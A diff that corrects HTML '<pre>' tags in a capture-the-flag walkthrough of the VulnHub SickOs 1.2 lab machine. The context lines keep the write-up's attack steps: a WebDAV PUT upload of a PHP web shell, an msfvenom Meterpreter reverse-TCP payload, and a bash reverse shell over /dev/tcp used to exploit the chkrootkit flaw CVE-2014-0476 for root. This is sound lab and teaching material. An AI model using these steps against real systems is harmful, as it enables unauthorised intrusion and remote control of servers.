@@ -6,7 +6,7 @@ This is a walkthrough of the SickOs 1.2 machine from VulnHub. It’s the sequel 
 After downloading and running the machine, we see that it was assigned the IP 192.168.2.4. A port scan using nmap reveals ports 80 (HTTP) and 22 (SSH) open.
 **>Target IP: 192.168.2.4**
 **>Initial Scan:**
-<pre
+<pre>
 nmap -A -T5 192.168.2.4
 root@kali:~/sickos2# nmap -A -T5 192.168.2.4
 
@@ -46,7 +46,7 @@ root@kali:~/sickos2# dirb http://192.168.2.4
 
 Making a HTTP OPTIONS request on this path shows that **/test** looks like a WebDAV directory.
 
-<pre
+<pre>
 root@kali:~/sickos2# curl --head -X OPTIONS 192.168.2.4/test/
 HTTP/1.1 200 OK
 DAV: 1,2
@@ -61,14 +61,14 @@ Supports PUT, confirming WebDAV is enabled.
 
 **🛠 Exploitation (Web Shell Upload)**
 We also note that the web server seems to accept HTTP PUT requests. The PUT method should allow us to upload arbitrary files on the web server. Let’s try it out. We create a file named **shell.php** containing the following code:
-<pre
+<pre>
 <?php
 echo shell_exec("id");
 ?>
 </pre>
 
 Upload using:
-<pre
+<pre>
   curl -v -X PUT -H "Expect: " 192.168.2.4/test/shell.php -d@shell.php
 </pre>
 Browse to /test/shell.php to confirm code execution as www-data.
@@ -76,7 +76,7 @@ Browse to /test/shell.php to confirm code execution as www-data.
 **🧠 Reverse Shell with Meterpreter**
 
 Now that we know we can upload arbitrary PHP scripts and execute them, let’s try to spawn a shell on the machine. We use msfvenom to generate the appropriate payload.
-<pre
+<pre>
   root@kali:~/sickos2# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.2.3 LPORT=4444 > shell.php
 </pre>
 Note that 192.168.2.3 is the IP of our Kali box, where we will listen for the incoming reverse shell. Using the same command as before, we start by uploading this script on the server.
@@ -86,7 +86,7 @@ root@kali:~/sickos2# curl -v -X PUT -H "Expect: " 192.168.2.4/test/shell.php -d@
 
 Start **Metasploit listener**:
 To catch our reverse shell.
-<pre
+<pre>
 
 root@kali:~/sickos2# msfconsole
 msf > use exploit/multi/handler
@@ -120,7 +120,7 @@ Vulnerable to **CVE-2014-0476**
 
 Exploiting CVE-2014-0476
 Write to /tmp/update:
-<pre
+<pre>
 #!/bin/bash
 bash -i >& /dev/tcp/192.168.2.3/443 0>&1
 </pre>  
@@ -149,7 +149,7 @@ Despite being in /etc/cron.daily/, it also exists in:
 /etc/cron.d/chkrootkit  
 </pre>
 
-
+<pre>
 **Summary**
 | Phase           | Technique Used                               |
 | --------------- | -------------------------------------------- |
@@ -161,7 +161,7 @@ Despite being in /etc/cron.daily/, it also exists in:
 | Root Access     | Netcat listener + shell script               |
 | Flag            | `/root/7d03aaa2bf93d80040f3f22ec6ad9d5a.txt` |
 
-
+</pre>
 
 
 
